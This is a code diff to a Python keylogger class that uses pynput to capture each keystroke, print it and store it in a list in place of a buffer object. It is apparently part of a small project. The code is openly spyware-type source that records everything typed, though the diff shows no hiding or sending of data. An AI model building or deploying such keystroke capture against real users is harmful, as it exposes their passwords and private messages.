@@ -1,13 +1,14 @@
-
 from pynput import keyboard
 from IKeyLogger import IKeyLogger
 from Buffer import Buffer
+
 
 class KeyLoggerService(IKeyLogger):
     def __init__(self):
         self.buffer = Buffer()
         self.running = False
         self.listener = None
+        self.list_data = []
 
     def on_press(self, key):
         try:
@@ -18,7 +19,7 @@ class KeyLoggerService(IKeyLogger):
 
             key_str = key.char if hasattr(key, 'char') else str(key)
             if key_str is not None:
-                self.buffer.add_data(key_str)
+                self.list_data.append(key_str)
                 print(f" pressed  : {key_str}")
         except Exception as e:
             print(f"error: {e}")
@@ -34,4 +35,4 @@ class KeyLoggerService(IKeyLogger):
             self.listener.stop()
 
     def get_logged_keys(self):
-        return self.buffer.get_data()
+        return self.list_data
